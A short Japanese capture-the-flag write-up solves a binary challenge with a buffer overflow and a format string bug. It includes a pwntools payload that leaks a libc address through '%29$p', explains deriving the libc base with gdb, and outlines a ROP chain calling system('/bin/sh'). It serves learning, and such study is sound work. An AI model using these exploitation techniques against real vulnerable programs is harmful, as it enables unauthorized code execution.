# bap
> BoF
> ROP
> FSB

## 解法

* ghidraに通すとBoFとFSBが見える
* checksecをすると、canaryもPIEもない
* flagを出力する関数があるわけでもないので、libcリークすればよさそう
* canaryもないのでROPを頑張ればよさそう
* ROPの最後にret mainをすれば何回も攻撃が可能

## libcリーク
```python
payload = b""
payload += b"%29$p" + b"a" * 3
payload += pwn.p64(0)
payload += pwn.p64(0)
ret = 0x00000000004011ce
payload += pwn.p64(ret)
payload += pwn.p64(e.sym["main"])
io.sendline(payload)
buf = io.recvuntil(b"aa")[:-2]
buf = int(buf, base=16)
libc_base = buf - 0x29e40
print(hex(buf))
```
FSBがあるので、良い感じにstack上のlibc由来の関数をgdbで見つける。今回は`libc_start_main+128`みたいな感じのやつがあったので、stack上での値(すなわち、libc_start_main+128のアドレス)を出力させれば良い。が、最初の`%29$p`から詰まった。printfの引数は、5個までレジスタに入り、それ以降はrbp, rbp+8, rbp+10, rbp+18, ... となる。小学生になりきると、rbpから29番目がlibc_start_main+128であることが分かった。`%29$p`は5文字であるため`+ b"a" * 3`を忘れない。これはljustみたいなのでも良いかもしれない。`payload += pwn.p64(ret)`はアラインメントの関係で必要。`0x29e40`は次のように求める。

## libc_baseを求める
libcが配置される場所は実行時に決まるので、その実行時でのlibcのベースアドレスがどこにあるかを知りたくなる。libc_baseを求めるのには、libc内での相対アドレスは変わらないことに着目する。

まず`gdb bap`で実行ファイルを走らせる。この時の%29の出力は、`その実行時のlibcベースアドレス + libc_baseからlibc_start_main+128までの距離`である。この時、`その実行時のlibcベースアドレス`は可変・`libc_baseからlibc_start_main+128までの距離`は不変である。gdb上でvmmapと入力し、libcの部分を見ると、`その実行時のlibcベースアドレス`が分かる。よって、`libc_baseからlibc_start_main+128までの距離`は引き算をすれば求まる。実際にプログラムに攻撃する際は、`%29の出力 - libc_baseからlibc_start_main+128までの距離(0x29e40)`をすると、これがベースアドレスになっていることが分かる。vmmapでデバッグをしながら計算しよう。

## system["/bin/sh"]
あとはROPで/bin/shを実行するだけ。rp++などを使ってガジェットを探しつつやろう。
```
pop rdi; ret;
/bin/sh
system
```
みたいなことをできるといいね。

## 解けた！
解けました。
